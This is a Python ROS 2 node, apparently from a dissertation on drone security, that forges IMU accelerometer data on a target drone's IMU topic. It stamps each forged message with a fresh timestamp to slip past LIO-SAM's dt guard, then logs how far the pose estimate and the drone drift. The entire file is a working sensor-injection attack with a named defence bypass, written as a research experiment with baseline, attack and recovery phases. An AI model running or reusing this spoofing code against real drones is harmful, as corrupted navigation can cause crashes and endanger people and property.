#!/usr/bin/env python3
"""
Layer 2 Attack — IMU Data Injection (v2: advancing-timestamp bypass)

Differs from imu_injector.py in two ways:

  (1) Each injected IMU message carries a fresh sim-time timestamp from
      self.get_clock().now() rather than reusing the most recent real
      IMU's stamp. This bypasses LIO-SAM's `dt <= 0` guard in
      imuPreintegration, which was the documented blocker for the
      original IMU injection attack (Section 3.5.5 of the dissertation).

  (2) Subscribes to LIO-SAM's mapping/odometry topic during the trial
      and records position drift in the per-second metric row. This
      provides a direct signal of whether the attack is corrupting
      LIO-SAM's pose estimate, separate from observable drone behaviour.

The experiment compares two hypotheses:
  H1  the dt-guard was the only defense; bypassing it allows IMU
      injection to corrupt LIO-SAM's pose estimate.
  H2  there is an additional defense (e.g. EKF3 innovation gate on
      vision_pose, or LIO-SAM-internal velocity threshold) that catches
      the attack even with monotonic timestamps.

Outcome in metrics CSV:
  - lio_sam_drift_m grows during attack phase  -> H1 supported
  - lio_sam_drift_m stays bounded during attack -> H2 supported

Usage (bias mode, 5 m/s^2 on X axis, default payload):
  ros2 run swarm_mission imu_injector_v2 --ros-args \
    -p target_drone:=drone1 \
    -p mode:=bias \
    -p accel_bias_x:=5.0 \
    -p injection_rate:=500.0 \
    -p baseline_duration:=15.0 \
    -p attack_duration:=45.0 \
    -p recovery_duration:=15.0
"""

import csv
import math
import os
import time
from datetime import datetime

import rclpy
from rclpy.node import Node
from rclpy.qos import (
    QoSProfile, ReliabilityPolicy, HistoryPolicy, DurabilityPolicy,
)
from sensor_msgs.msg import Imu
from geometry_msgs.msg import PoseStamped, Pose
from nav_msgs.msg import Odometry


class ImuInjectorV2(Node):
    def __init__(self):
        super().__init__('imu_injector_v2')

        # ---- Parameters ----
        self.declare_parameter('target_drone', 'drone1')
        self.declare_parameter('mode', 'bias')             # bias | spike | flip
        self.declare_parameter('injection_rate', 500.0)    # Hz
        self.declare_parameter('baseline_duration', 15.0)
        self.declare_parameter('attack_duration', 45.0)
        self.declare_parameter('recovery_duration', 15.0)

        self.declare_parameter('accel_bias_x', 5.0)
        self.declare_parameter('accel_bias_y', 0.0)
        self.declare_parameter('accel_bias_z', 0.0)

        self.declare_parameter('spike_magnitude', 30.0)
        self.declare_parameter('spike_axis', 'z')

        self.declare_parameter('output_dir', os.path.expanduser('~'))

        self.target_drone = self.get_parameter('target_drone').value
        self.mode = self.get_parameter('mode').value
        self.injection_rate = self.get_parameter('injection_rate').value
        self.baseline_dur = self.get_parameter('baseline_duration').value
        self.attack_dur = self.get_parameter('attack_duration').value
        self.recovery_dur = self.get_parameter('recovery_duration').value

        self.accel_bias_x = self.get_parameter('accel_bias_x').value
        self.accel_bias_y = self.get_parameter('accel_bias_y').value
        self.accel_bias_z = self.get_parameter('accel_bias_z').value

        self.spike_magnitude = self.get_parameter('spike_magnitude').value
        self.spike_axis = self.get_parameter('spike_axis').value

        self.output_dir = self.get_parameter('output_dir').value

        # ---- Topics ----
        self.imu_topic = f'/{self.target_drone}/imu/data'
        if self.target_drone == 'drone1':
            self.local_pos_topic = '/mavros/local_position/pose'
        else:
            self.local_pos_topic = f'/{self.target_drone}/mavros/local_position/pose'
        self.lio_odom_topic = f'/{self.target_drone}/lio_sam/mapping/odometry'

        # ---- State ----
        self.phase = 'baseline'
        self.phase_start_time = None
        self.latest_real_imu = None
        self.drone_pose = None
        self.lio_pose = None
        self.lio_origin = None              # LIO-SAM pose at attack start
        self.attack_origin = None           # MAVROS pose at attack start
        self.inject_timer = None
        self.inject_count = 0

        self.metrics = []
        self.metric_interval = 1.0
        self.last_metric_time = 0.0

        # ---- QoS ----
        qos_besteffort = QoSProfile(
            reliability=ReliabilityPolicy.BEST_EFFORT,
            history=HistoryPolicy.KEEP_LAST,
            durability=DurabilityPolicy.VOLATILE,
            depth=5,
        )

        self.imu_sub = self.create_subscription(
            Imu, self.imu_topic, self.imu_callback, qos_besteffort,
        )
        self.pose_sub = self.create_subscription(
            PoseStamped, self.local_pos_topic, self.pose_callback, qos_besteffort,
        )
        self.lio_sub = self.create_subscription(
            Odometry, self.lio_odom_topic, self.lio_callback, qos_besteffort,
        )

        # Publisher (publishes to the same topic the real IMU publishes on)
        self.imu_pub = self.create_publisher(
            Imu, self.imu_topic, qos_besteffort,
        )

        self.phase_timer = self.create_timer(0.5, self.phase_tick)

        # ---- CSV ----
        timestamp_str = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.csv_path = os.path.join(
            self.output_dir,
            f'imu_injection_v2_metrics_{self.target_drone}_{timestamp_str}.csv',
        )

        mode_desc = {
            'bias': f'BIAS accel +({self.accel_bias_x},{self.accel_bias_y},{self.accel_bias_z}) m/s^2',
            'spike': f'SPIKE {self.spike_magnitude} m/s^2 on {self.spike_axis}-axis',
            'flip': 'FLIP (invert gravity)',
        }.get(self.mode, self.mode)

        self.get_logger().info(
            f'\n=== IMU Injection v2 (advancing timestamps) ===\n'
            f'  Target: {self.target_drone}\n'
            f'  IMU topic: {self.imu_topic}\n'
            f'  Mode: {mode_desc}\n'
            f'  Injection rate: {self.injection_rate} Hz\n'
            f'  Baseline {self.baseline_dur}s | Attack {self.attack_dur}s | Recovery {self.recovery_dur}s\n'
            f'  CSV: {self.csv_path}\n'
            f'  Starting BASELINE phase...'
        )
        self.phase_start_time = time.monotonic()

    # ---- Subscription callbacks ----
    def imu_callback(self, msg: Imu):
        self.latest_real_imu = msg

    def pose_callback(self, msg: PoseStamped):
        self.drone_pose = msg.pose

    def lio_callback(self, msg: Odometry):
        self.lio_pose = msg.pose.pose

    # ---- Injection ----
    def publish_injection(self):
        """Publish a fake IMU message with a fresh sim-time stamp so it
        bypasses LIO-SAM's dt <= 0 guard."""
        if self.latest_real_imu is None:
            return

        msg = Imu()

        # *** THE BYPASS: fresh sim-time stamp on every injection ***
        msg.header.stamp = self.get_clock().now().to_msg()
        msg.header.frame_id = self.latest_real_imu.header.frame_id

        # Plausible orientation + angular velocity from the real stream
        msg.orientation = self.latest_real_imu.orientation
        msg.angular_velocity = self.latest_real_imu.angular_velocity

        if self.mode == 'bias':
            msg.linear_acceleration.x = (
                self.latest_real_imu.linear_acceleration.x + self.accel_bias_x
            )
            msg.linear_acceleration.y = (
                self.latest_real_imu.linear_acceleration.y + self.accel_bias_y
            )
            msg.linear_acceleration.z = (
                self.latest_real_imu.linear_acceleration.z + self.accel_bias_z
            )
        elif self.mode == 'spike':
            msg.linear_acceleration.x = self.latest_real_imu.linear_acceleration.x
            msg.linear_acceleration.y = self.latest_real_imu.linear_acceleration.y
            msg.linear_acceleration.z = self.latest_real_imu.linear_acceleration.z
            if self.spike_axis == 'x':
                msg.linear_acceleration.x += self.spike_magnitude
            elif self.spike_axis == 'y':
                msg.linear_acceleration.y += self.spike_magnitude
            else:
                msg.linear_acceleration.z += self.spike_magnitude
        elif self.mode == 'flip':
            msg.linear_acceleration.x = -self.latest_real_imu.linear_acceleration.x
            msg.linear_acceleration.y = -self.latest_real_imu.linear_acceleration.y
            msg.linear_acceleration.z = -self.latest_real_imu.linear_acceleration.z

        msg.orientation_covariance = self.latest_real_imu.orientation_covariance
        msg.angular_velocity_covariance = self.latest_real_imu.angular_velocity_covariance
        msg.linear_acceleration_covariance = self.latest_real_imu.linear_acceleration_covariance

        self.imu_pub.publish(msg)
        self.inject_count += 1

    # ---- Phase management ----
    def phase_tick(self):
        now = time.monotonic()
        elapsed = now - self.phase_start_time

        # Drone displacement (MAVROS local position vs attack start)
        drone_disp = None
        if self.attack_origin is not None and self.drone_pose is not None:
            dx = self.drone_pose.position.x - self.attack_origin.position.x
            dy = self.drone_pose.position.y - self.attack_origin.position.y
            dz = self.drone_pose.position.z - self.attack_origin.position.z
            drone_disp = math.sqrt(dx*dx + dy*dy + dz*dz)

        # LIO-SAM-frame drift (LIO-SAM pose vs LIO-SAM pose at attack start)
        lio_disp = None
        if self.lio_origin is not None and self.lio_pose is not None:
            dx = self.lio_pose.position.x - self.lio_origin.position.x
            dy = self.lio_pose.position.y - self.lio_origin.position.y
            dz = self.lio_pose.position.z - self.lio_origin.position.z
            lio_disp = math.sqrt(dx*dx + dy*dy + dz*dz)

        if now - self.last_metric_time >= self.metric_interval:
            self.last_metric_time = now
            metric = {
                'timestamp': datetime.now().isoformat(),
                'phase': self.phase,
                'phase_elapsed_s': round(elapsed, 2),
                'inject_count': self.inject_count,
                'drone_drift_m': round(drone_disp, 3) if drone_disp is not None else None,
                'lio_sam_drift_m': round(lio_disp, 3) if lio_disp is not None else None,
            }
            if self.drone_pose is not None:
                metric['drone_x'] = round(self.drone_pose.position.x, 3)
                metric['drone_y'] = round(self.drone_pose.position.y, 3)
                metric['drone_z'] = round(self.drone_pose.position.z, 3)
            if self.lio_pose is not None:
                metric['lio_x'] = round(self.lio_pose.position.x, 3)
                metric['lio_y'] = round(self.lio_pose.position.y, 3)
                metric['lio_z'] = round(self.lio_pose.position.z, 3)
            self.metrics.append(metric)

            phase_char = {'baseline': '[B]', 'attack': '[A]', 'recovery': '[R]'}.get(
                self.phase, '[?]'
            )
            ddrift = f'{drone_disp:.2f}' if drone_disp is not None else '----'
            ldrift = f'{lio_disp:.2f}' if lio_disp is not None else '----'
            self.get_logger().info(
                f'{phase_char} {elapsed:5.0f}s | '
                f'drone-drift {ddrift}m | LIO drift {ldrift}m | '
                f'inj {self.inject_count}'
            )

        if self.phase == 'baseline' and elapsed >= self.baseline_dur:
            self._start_attack()
        elif self.phase == 'attack' and elapsed >= self.attack_dur:
            self._start_recovery()
        elif self.phase == 'recovery' and elapsed >= self.recovery_dur:
            self._finish()

    def _capture_pose(self, src):
        """Snapshot a Pose so future delta calculations are meaningful."""
        if src is None:
            return None
        p = Pose()
        p.position.x = src.position.x
        p.position.y = src.position.y
        p.position.z = src.position.z
        p.orientation = src.orientation
        return p

    def _start_attack(self):
        self.phase = 'attack'
        self.phase_start_time = time.monotonic()
        self.attack_origin = self._capture_pose(self.drone_pose)
        self.lio_origin = self._capture_pose(self.lio_pose)

        period = 1.0 / self.injection_rate
        self.inject_timer = self.create_timer(period, self.publish_injection)
        self.get_logger().warn(
            f'=== ATTACK PHASE — fake IMU at {self.injection_rate} Hz with advancing stamps ==='
        )

    def _start_recovery(self):
        self.phase = 'recovery'
        self.phase_start_time = time.monotonic()
        if self.inject_timer is not None:
            self.inject_timer.cancel()
            self.destroy_timer(self.inject_timer)
            self.inject_timer = None
        self.get_logger().warn('=== RECOVERY PHASE — injection stopped ===')

    def _finish(self):
        self.phase = 'done'
        self.phase_timer.cancel()
        self._write_csv()

        attack = [m for m in self.metrics if m['phase'] == 'attack']
        max_drone = max((m['drone_drift_m'] for m in attack
                         if m.get('drone_drift_m') is not None), default=0)
        max_lio = max((m['lio_sam_drift_m'] for m in attack
                       if m.get('lio_sam_drift_m') is not None), default=0)
        final_drone = (attack[-1].get('drone_drift_m') if attack else 0) or 0
        final_lio = (attack[-1].get('lio_sam_drift_m') if attack else 0) or 0

        verdict = 'BYPASS DEFEATS LIO-SAM' if max_lio > 1.0 else 'LIO-SAM SURVIVES'
        verdict_drone = 'DRONE PHYSICALLY DRIFTED' if max_drone > 1.0 else 'DRONE STAYED PUT'

        self.get_logger().warn(
            f'\n'
            f'+--------------------------------------------+\n'
            f'|     IMU INJECTION v2 — ATTACK RESULTS      |\n'
            f'+--------------------------------------------+\n'
            f'  Target: {self.target_drone}\n'
            f'  Mode: {self.mode}\n'
            f'  Injected messages: {self.inject_count}\n'
            f'  --- LIO-SAM frame drift ---\n'
            f'    max during attack: {max_lio:.2f} m\n'
            f'    final at end of attack: {final_lio:.2f} m\n'
            f'    verdict: {verdict}\n'
            f'  --- Drone physical drift (MAVROS) ---\n'
            f'    max during attack: {max_drone:.2f} m\n'
            f'    final at end of attack: {final_drone:.2f} m\n'
            f'    verdict: {verdict_drone}\n'
            f'  CSV: {self.csv_path}'
        )

    def _write_csv(self):
        if not self.metrics:
            return
        fieldnames = [
            'timestamp', 'phase', 'phase_elapsed_s', 'inject_count',
            'drone_drift_m', 'lio_sam_drift_m',
            'drone_x', 'drone_y', 'drone_z',
            'lio_x', 'lio_y', 'lio_z',
        ]
        try:
            with open(self.csv_path, 'w', newline='') as f:
                writer = csv.DictWriter(
                    f, fieldnames=fieldnames, extrasaction='ignore'
                )
                writer.writeheader()
                writer.writerows(self.metrics)
            self.get_logger().info(f'Wrote {len(self.metrics)} rows to {self.csv_path}')
        except Exception as e:
            self.get_logger().error(f'Failed to write CSV: {e}')


def main(args=None):
    rclpy.init(args=args)
    node = ImuInjectorV2()
    try:
        rclpy.spin(node)
    except KeyboardInterrupt:
        if node.phase != 'done':
            node.get_logger().warn('Interrupted — writing partial metrics...')
            node._write_csv()
        node.get_logger().info(
            f'Shutting down — {node.inject_count} IMU messages injected'
        )
    finally:
        if node.inject_timer is not None:
            node.inject_timer.cancel()
        node.destroy_node()
        rclpy.shutdown()


if __name__ == '__main__':
    main()
